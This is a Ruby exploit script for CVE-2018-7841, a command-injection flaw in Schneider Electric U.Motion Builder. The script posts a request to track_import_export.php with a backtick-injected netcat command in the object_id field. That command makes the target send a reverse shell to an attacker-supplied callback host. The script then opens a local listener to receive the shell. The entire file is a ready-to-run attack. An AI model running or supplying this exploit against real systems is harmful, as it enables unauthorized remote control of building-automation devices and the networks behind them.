#!/usr/bin/env ruby 
# CVE-2018-7841 / Schneider Electric U.Motion Builder 1.3.4 
# and below track_import_export.php command injection.

require 'rex'

host =  ARGV[0]
lhost = ARGV[1]

def usage
   puts "#{$0} <target> <callback>"
   exit
end

usage if ARGV.size  < 2 

begin

sock = Rex::Proto::Http::Client.new(host, port = "8080", context = {}, ssl = false)


wtf = "op=export&language=english&interval=1&object_id=`nc #{lhost} -e /bin/sh 65535`"

req = sock.request_cgi(
	{
		'uri'   => "/smartdomuspad/modules/reporting/track_import_export.php",
		'version' => '1.0',
		'method' => 'POST',
                'cookie' => 'PHPSESSID=' + Rex::Text.rand_text_alpha_lower(26),
                'data' => wtf,
	})

	sock.send_request(req)
        system("nc -v -l 65535")
	#data = sock.read_response()
rescue => e
puts "[!] #{e.to_s}"
end
